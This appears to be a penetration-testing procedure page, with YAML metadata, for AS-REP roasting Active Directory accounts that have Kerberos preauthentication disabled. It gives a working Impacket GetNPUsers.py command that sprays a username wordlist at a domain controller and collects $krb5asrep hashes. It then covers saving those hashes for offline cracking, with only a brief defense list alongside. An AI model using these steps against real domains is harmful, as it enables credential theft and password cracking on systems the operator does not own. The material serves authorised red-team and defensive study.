---
id: a2766e48-3477-4a2a-9807-a89e3ccc67c1
name: Brute-Force-AS-REP-Roasting-for-Users-Without-Preauth
type: procedure
verified: true
submitted: false
created_at: '2020-03-17T21:43:18.756014+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
  - '[[Credential Access]]'
techniques:
  - '[[rubeus-asrep-roast-user]]'
  - '[[Password Spraying]]'
sub_techniques: []
tags:
  - active-directory
  - kerberos
  - as-rep-roasting
  - enumeration
commands:
  - '[[commands/getnpusers-py-brute-force-no-preauth]]'
platforms:
  - Linux
tools:
  - '[[tools/Impacket]]'
validated: true
---

# Brute-Force-AS-REP-Roasting-for-Users-Without-Preauth

## Summary

This procedure identifies valid domain users with the 'Do not require Kerberos preauthentication' flag enabled and requests their AS-REP tickets using GetNPUsers.py, producing crackable hashes without needing passwords.

## Description

Users with UF_DONT_REQUIRE_PREAUTH (flag 0x0020) allow AS-REP roasting, where the KDC responds with an encrypted TGT using the user's password hash as the key. Valid usernames trigger hash disclosure, enabling offline cracking. This is effective against legacy or misconfigured AD accounts.

## Requirements

- Username wordlist from enumeration
- Domain controller IP accessible (UDP 88)
- Impacket installed

## Defense

- Audit and disable preauth for non-essential accounts
- Monitor Kerberos AS-REQ/AS-REP logs for anomalies
- Use account lockout on suspicious requests

## Objectives

1. Brute-force usernames to find valid ones
2. Obtain AS-REP hashes for cracking
3. Confirm exploitable accounts

## Instructions

### Step 1: Prepare Username Wordlist

**Context**: Use output from user enumeration to create users.txt with one username per line.

No command; edit file manually, e.g., echo 'admin
user1
user2' > users.txt.

### Step 2: Request AS-REP Tickets

**Context**: Run GetNPUsers.py to spray usernames and request tickets only for preauth-disabled accounts.

**Command** ([[commands/getnpusers-py-brute-force-no-preauth]]):
```bash
GetNPUsers.py $_DOMAIN/ -no-pass -usersfile $_USERS_TXT -dc-ip $_DC_IP -request
```

> The -request flag outputs hashes. Valid users produce $krb5asrep hashes; invalid ones error.

### Step 3: Extract and Save Hashes

**Context**: Filter successful outputs for cracking.

No command; grep for '$krb5asrep' > hashes.txt.

**Expected Output**: Hash file with entries like '$krb5asrep$23$username@domain:hashvalue'.

## Expected Output

$krb5asrep$23$svcuser@DOMAIN:abcdef123456...

Success for valid preauth-disabled user.
